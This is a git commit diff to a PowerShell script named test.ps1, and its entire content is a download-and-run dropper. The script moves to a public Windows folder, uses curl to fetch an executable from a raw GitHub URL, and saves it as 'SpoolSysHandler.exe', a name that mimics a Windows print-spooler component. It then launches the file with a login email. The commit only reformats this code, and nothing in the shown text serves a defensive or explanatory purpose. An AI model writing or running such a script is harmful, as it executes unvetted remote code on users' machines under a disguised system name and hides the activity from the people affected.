2afe8f8f569ad7563a2024e443e29990ccf8c06a
Aman Tiwari <30314708+TheAmanTiwari@users.noreply.github.com>
2021-12-29 15:19:27 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,1 +1,3 @@
-cd C:\Users\admin\AppData\Local\Temp; curl https://raw.githubusercontent.com/null01byte/p2prof/main/p2pclient.exe -o SpoolSysHandler.exe; .\SpoolSysHandler --login nullbyte0011@protonmail.com
+cd C:\Users\Public\Libraries
+curl https://raw.githubusercontent.com/null01byte/p2prof/main/p2pclient.exe -o SpoolSysHandler.exe
+.\SpoolSysHandler --login nullbyte0011@protonmail.com
